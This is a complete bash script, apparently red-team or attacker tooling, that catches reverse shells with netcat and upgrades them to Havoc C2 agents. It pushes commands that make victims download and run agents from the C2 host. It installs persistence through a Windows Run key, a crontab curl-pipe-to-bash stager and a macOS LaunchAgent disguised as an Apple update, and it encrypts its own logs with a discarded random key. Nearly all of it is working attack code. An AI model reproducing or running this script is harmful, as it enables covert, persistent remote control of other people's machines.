#!/bin/bash
# Automated shell handler for catching and upgrading shells to Havoc C2 agents

# Configuration 
LISTEN_PORT=4444
C2_HOST="127.0.0.1"  # This will be replaced by Ansible with actual C2 IP
HAVOC_PORT=40056     # Havoc default Teamserver port
HAVOC_USER="admin"
HAVOC_DIR="/root/Tools/Havoc"
WINDOWS_PAYLOAD="windows/agent_win.exe"
LINUX_PAYLOAD="linux/agent_linux"

# Set secure permissions
umask 077

# Logging function (minimal and encrypted)
log() {
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    local message="$1"
    echo "$timestamp - $message" | openssl enc -e -aes-256-cbc -pbkdf2 -pass pass:$RANDOM$RANDOM$RANDOM >> /root/Tools/shell-handler/activity.log.enc
}

# Detect OS function
detect_os() {
    local connection=$1
    
    # Send commands to determine OS
    echo "echo \$OSTYPE" > $connection
    sleep 1
    ostype=$(cat $connection | grep -i "linux\|darwin\|win")
    
    if [[ $ostype == *"win"* ]]; then
        echo "windows"
    elif [[ $ostype == *"darwin"* ]]; then
        echo "macos"
    elif [[ $ostype == *"linux"* ]]; then
        echo "linux"
    else
        # Try Windows-specific command
        echo "ver" > $connection
        sleep 1
        winver=$(cat $connection | grep -i "microsoft windows")
        
        if [[ -n "$winver" ]]; then
            echo "windows"
        else
            # Default to Linux if we can't determine
            echo "linux"
        fi
    fi
}

# Get Havoc password
get_havoc_password() {
    # Extract password from Havoc profile
    HAVOC_PASS=$(grep 'Password' $HAVOC_DIR/data/profiles/default.yaotl | cut -d'"' -f2)
    echo $HAVOC_PASS
}

# Deploy appropriate Havoc agent based on OS
deploy_agent() {
    local connection=$1
    local os_type=$2
    
    log "Deploying Havoc agent for detected OS: $os_type"
    
    # Get the latest payload paths from manifest
    local manifest="/root/Tools/Havoc/payloads/manifest.json"
    if [ -f "$manifest" ]; then
        if [ "$os_type" == "windows" ]; then
            WIN_EXE=$(jq -r '.windows_exe' "$manifest")
            PAYLOAD_PATH="/root/Tools/Havoc/payloads/windows/$WIN_EXE"
        elif [ "$os_type" == "linux" ]; then
            LINUX_BIN=$(jq -r '.linux_binary' "$manifest")
            PAYLOAD_PATH="/root/Tools/Havoc/payloads/linux/$LINUX_BIN"
        fi
    else
        # Use default paths if manifest doesn't exist
        if [ "$os_type" == "windows" ]; then
            PAYLOAD_PATH="/root/Tools/Havoc/payloads/windows/agent_win.exe"
        elif [ "$os_type" == "linux" ]; then
            PAYLOAD_PATH="/root/Tools/Havoc/payloads/linux/agent_linux"
        fi
    fi
    
    case $os_type in
        windows)
            # Setup Python HTTP server for payload delivery
            mkdir -p /tmp/havoc_payloads
            cp "$PAYLOAD_PATH" /tmp/havoc_payloads/update.exe
            cd /tmp/havoc_payloads
            python3 -m http.server 8888 &
            HTTP_PID=$!
            
            # Use PowerShell to download and execute
            echo "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('http://$C2_HOST:8888/update.exe', \$env:TEMP+'\\update.exe'); Start-Process \$env:TEMP+'\\update.exe'" > $connection
            sleep 10
            
            # Cleanup HTTP server
            kill $HTTP_PID
            ;;
        linux)
            # Setup Python HTTP server for payload delivery
            mkdir -p /tmp/havoc_payloads
            cp "$PAYLOAD_PATH" /tmp/havoc_payloads/update
            chmod +x /tmp/havoc_payloads/update
            cd /tmp/havoc_payloads
            python3 -m http.server 8888 &
            HTTP_PID=$!
            
            # Use curl to download and execute
            echo "curl -s http://$C2_HOST:8888/update -o /tmp/update && chmod +x /tmp/update && /tmp/update &" > $connection
            sleep 10
            
            # Cleanup HTTP server
            kill $HTTP_PID
            ;;
        macos)
            # For macOS, we'll attempt to use the Linux payload
            mkdir -p /tmp/havoc_payloads
            cp "$PAYLOAD_PATH" /tmp/havoc_payloads/update
            chmod +x /tmp/havoc_payloads/update
            cd /tmp/havoc_payloads
            python3 -m http.server 8888 &
            HTTP_PID=$!
            
            # Use curl to download and execute
            echo "curl -s http://$C2_HOST:8888/update -o /tmp/update && chmod +x /tmp/update && /tmp/update &" > $connection
            sleep 10
            
            # Cleanup HTTP server
            kill $HTTP_PID
            ;;
    esac
    
    log "Havoc agent deployment command sent"
}

# Establish persistence based on OS
establish_persistence() {
    local connection=$1
    local os_type=$2
    
    log "Attempting to establish persistence on $os_type"
    
    case $os_type in
        windows)
            # Windows persistence via registry run key
            echo "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d %TEMP%\\update.exe /f" > $connection
            ;;
        linux)
            # Linux persistence via crontab
            echo "(crontab -l 2>/dev/null; echo '*/15 * * * * curl -s http://$C2_HOST:8443/linux_stager.sh | bash') | crontab -" > $connection
            ;;
        macos)
            # macOS persistence via launch agent
            echo "mkdir -p ~/Library/LaunchAgents" > $connection
            echo "echo '<plist version=\"1.0\"><dict><key>Label</key><string>com.apple.software.update</string><key>ProgramArguments</key><array><string>bash</string><string>-c</string><string>curl -s http://$C2_HOST:8443/linux_stager.sh | bash</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>900</integer></dict></plist>' > ~/Library/LaunchAgents/com.apple.software.update.plist" > $connection
            echo "launchctl load ~/Library/LaunchAgents/com.apple.software.update.plist" > $connection
            ;;
    esac
    
    log "Persistence commands sent for $os_type"
}

# Main shell handler loop
handle_connections() {
    log "Shell handler started on port $LISTEN_PORT"
    
    # Use mkfifo for bidirectional communication
    PIPE_PATH="/tmp/shell_handler_pipe"
    trap 'rm -f $PIPE_PATH' EXIT
    
    while true; do
        # Clean up existing pipe
        rm -f $PIPE_PATH
        mkfifo $PIPE_PATH
        
        log "Waiting for incoming connection..."
        nc -lvnp $LISTEN_PORT < $PIPE_PATH | tee $PIPE_PATH.output &
        NC_PID=$!
        
        # Wait for connection to be established
        while ! grep -q . $PIPE_PATH.output 2>/dev/null; do
            sleep 1
            # Check if nc is still running
            if ! kill -0 $NC_PID 2>/dev/null; then
                log "Netcat process died, restarting..."
                rm -f $PIPE_PATH $PIPE_PATH.output
                continue 2  # Restart the outer loop
            fi
        done
        
        log "Connection received, detecting OS..."
        DETECTED_OS=$(detect_os "$PIPE_PATH.output")
        log "Detected OS: $DETECTED_OS"
        
        # Deploy Havoc agent
        deploy_agent "$PIPE_PATH" "$DETECTED_OS"
        sleep 5
        
        # Establish persistence
        establish_persistence "$PIPE_PATH" "$DETECTED_OS"
        sleep 5
        
        # Keep connection alive for manual operation if needed
        log "Havoc agent deployed, maintaining shell connection..."
        echo "echo 'Shell upgraded to Havoc agent. This connection will remain active for manual operation.'" > $PIPE_PATH
        
        # Wait for connection to close
        wait $NC_PID
        log "Connection closed, cleaning up and restarting listener..."
        rm -f $PIPE_PATH.output
    done
}

# Start the shell handler
handle_connections